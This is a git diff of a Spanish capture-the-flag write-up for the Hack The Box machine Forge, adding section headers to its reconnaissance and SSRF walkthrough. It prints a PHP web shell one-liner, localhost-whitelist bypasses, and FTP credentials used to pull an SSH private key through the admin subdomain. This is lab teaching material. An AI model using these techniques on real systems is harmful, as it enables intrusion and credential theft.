@@ -1,5 +1,9 @@
-Forge -> 10.10.11.111
----------------------
+10.10.11.111 Forge
+
+--------------------------
+
+### PARTE 1. Reconocimiento
+
 Con el script de escaneo en bash hemos descubierto los puertos 22(ssh) y 80(http)
 
 ```console
@@ -8,20 +12,27 @@ http://10.10.11.111 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServe
 ```
 Vamos a meter en el /etc/hosts el nombre Forge.htb.
 
+--------------------------
+
+### PARTE 2. SSRF
+
 Entramos y tenemos una galeria de fotos y una ruta para subir una imagen.
-Subimos la clásica shell.php  ```<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>``` y nos dan el enlace para visualizarlo:   ```http://forge.htb/uploads/lYl9YmpShrA2sOWeUw96``` donde nos dicen que la foto no se puede visualizar y tiene errores. El asunto esque se inutiliza la
-shell porque muestra su codigo y no lo interpreta. Al ponerle por tanto un parametro como ```?cmd=whoami``` da un error 404.   
+Subimos la clásica shell.php  ```<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>``` y nos dan el enlace para visualizarlo:   ```http://forge.htb/uploads/lYl9YmpShrA2sOWeUw96``` Donde nos dicen que la foto no se puede visualizar y tiene errores.  
+El asunto esque se inutiliza la shell porque muestra su codigo y no lo interpreta. Al ponerle por tanto un parametro como ```?cmd=whoami``` da un error 404.   
 
-La otra opcion que tenemos es la de subir una foto por una url. No se puede subir nada de internet porque por motivos de seguridad las maquinas de  hackthebox no tienen salida a internt. Como podemos meter una ruta,  a la que la web le hace una peticion, vamos a intentar un SSRF (mostrar urls de
-solo acceso interno, al ser la maquina la que hace la peticion, y no nadie de fuera, las deberia mostrar)
+La otra opcion que tenemos es la de subir una foto por una url. (No se puede subir nada de internet porque por motivos de seguridad las maquinas de  hackthebox no
+tienen salida a internet).
+Como podemos meter una ruta,  a la que la web le hace una peticion, vamos a intentar un SSRF (mostrar urls de solo acceso interno, al ser la maquina la que hace la
+peticion, y no nadie de fuera, las deberia mostrar)
 
-Ponemos ```http://localhost``` y nos dice que esta whitelisteado. Si ponemos ```http://127.1``` (otra manera de referenciar al localhost, no hay  problema). Poniendo el nombre de la maquina ```http://forge.htb``` no, pero si cambiamos mayusculas por minusculas si ```http://ForGe.HtB```. 
+Ponemos ```http://localhost``` y nos dice que esta whitelisteado. Si ponemos ```http://127.1``` (otra manera de referenciar al localhost, no hay  problema).
+Poniendo el nombre de la maquina ```http://forge.htb``` no, pero si cambiamos mayusculas por minusculas si ```http://ForGe.HtB```. 
 Siguiendo el enlace dice que la foto tiene errores pero si le hacemos un curl ya nos da el codigo fuente de la pagina. 
 
 Peticion -> POST a http://forge.htb/upload -> url=http://ForGe.hTb&remote=1
 
-Como ya tenemos como meter el localhost, podemos acceder a subdominios restringidos y demas.
-```
+Como ya tenemos como meter el localhost, podemos acceder a subdominios restringidos y demas:
+```console
 └─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u http://forge.htb
 Found: test2.forge.htb (Status: 302) [Size: 281]
 Found: news.forge.htb (Status: 302) [Size: 280]
@@ -57,6 +68,10 @@ $:> ftp://user:heightofsecurity123!@FoRgE.hTb
 curl: no URL specified!
 curl: try 'curl --help' or 'curl --manual' for more information
 ```
+--------------------------
+
+### PARTE 3. SSRF a /upload privilegiado
+
 No deja acceder al ftp directamente, pero nos dice que la ruta ```/uploads?u``` permite mostrar archivos, a esta ruta seguimos accediendo con el SSRF 
 ya que el **admin.** no esta expuesto hacia fuera.
 ```console
@@ -87,9 +102,13 @@ $:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb/.s
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 ....
 ```
+
 Para explicar todo este lio de una manera mas visual:
 ![forge htb](https://user-images.githubusercontent.com/96772264/196032318-a1670655-e326-4151-b3b7-c403aa5d30ab.png)
 
+--------------------------
+
+### PARTE 4. Escalada de Privilegios
 
 Modifique el script para que guardara esto en un archivo id_rsa y luego ```chmod 600 ./id_rsa```.
 ```console
